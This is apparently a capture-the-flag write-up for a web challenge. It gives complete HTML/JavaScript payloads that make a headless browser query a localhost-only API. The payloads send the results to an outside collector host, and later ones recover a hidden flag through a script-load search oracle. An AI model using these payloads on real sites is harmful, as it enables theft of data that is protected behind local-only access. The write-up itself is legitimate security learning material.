1. After analyzing the code, we got some useful information
   - The flag was in `userEntries` table's `title` column and its `approved` is `0`.
   - There were two api, `GET /api/entries` and `GET /api/entries/search`, to allow us to access `userEntries` table, but to rows with `approved=0` we need to access via `127.0.0.1`
   - `POST /api/entries` allowed us to visit other pages, but it wouldn't return the page content. The headless browser would stay on the page for `7` seconds.

```js
const isLocalhost = req => ((req.ip == '127.0.0.1' && req.headers.host == '127.0.0.1:1337') ? 0 : 1);
```

2. We decided to create a website with public ip or domain and make `POST /api/entries` to access our website. In the website, we will call the `GET 127.0.0.1:1337/api/entries` to get the content and make another request to our site with content as its parameter.
   - We put our html in [CodeSandbox](https://codesandbox.io) to allow the target to access.
   - And to get our results, we would make a request to `https://test.requestcatcher.com/`.

```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Test</title>

</head>
<body>
    <script>
        fetch('http://127.0.0.1:1337/api/entries', { mode: 'no-cors'})
        .then((response) => response.json())
        .then((data) => {
            const q = btoa(JSON.stringify(data));
            fetch(`https://test.requestcatcher.com?q=${q}`);
        })
    </script>
</body>
</html>
```

3. Unfortunately, due to the **Same Origin Policy** for GET and JSON data type, the above method didn't work. Thus, we decided to use `GET /api/entries/search` that would return status code `404` if no matching title was found. We use `<script src="http://127.0.0.1/api/entries/search?q=HTB{xxx">` to gradually and blindly get our flag.


```html
-- This html allow us to test approve=1's title 
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Test</title>

</head>
<body>
    <script>
        const chars =
          "-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
        let flag = "B";
        const target = "178.128.37.153:30039"
        const payload = `http://${target}/api/entries/search?q=`;
    
        function addScript(c) {
          return new Promise((resolve, reject) => {
            const script = document.createElement("script");
            script.src = `${payload}${encodeURIComponent(flag + c)}`
            script.onload = () => resolve(c);
            script.onerror = () => reject(c);
    
            document.head.appendChild(script);
          });
        }
    
        async function getFlag() {
          for (let i = 0; i < 5; i++) {
            let found = false;
            for (c of chars) {
                try {
                    const fragment = await addScript(c)
                    flag = flag + fragment
                    found = true
                    break
                } catch (e) {}
            }
            if (!found) {
                break
            }
          }
          console.log(flag)
        }

        getFlag()
      </script>
</body>
</html>
```

4. Since the headless browser only stops for `7` seconds, we couldn't get all flags in a single request. We would need to gradually add the results back the our `flag` variable.

```html
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Test</title>

</head>
<body>
    <script>
        const chars =
          "-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
        let flag = "HTB{";
        const target = "178.128.37.153:30039"
        const payload = `http://${target}/api/entries/search?q=`;
    
        function addScript(c) {
          return new Promise((resolve, reject) => {
            const script = document.createElement("script");
            script.src = `${payload}${encodeURIComponent(flag + c)}`
            script.onload = () => resolve(c);
            script.onerror = () => reject(c);
    
            document.head.appendChild(script);
          });
        }
    
        async function getFlag() {
          for (let i = 0; i < 10; i++) {
            let found = false;
            for (c of chars) {
                try {
                    const fragment = await addScript(c)
                    flag = flag + fragment
                    fetch(`https://test.requestcatcher.com?q=${flag}`);
                    found = true
                    break
                } catch (e) {}
            }
            if (!found) {
                break
            }
          }
        }

        getFlag()
      </script>
</body>
</html>

```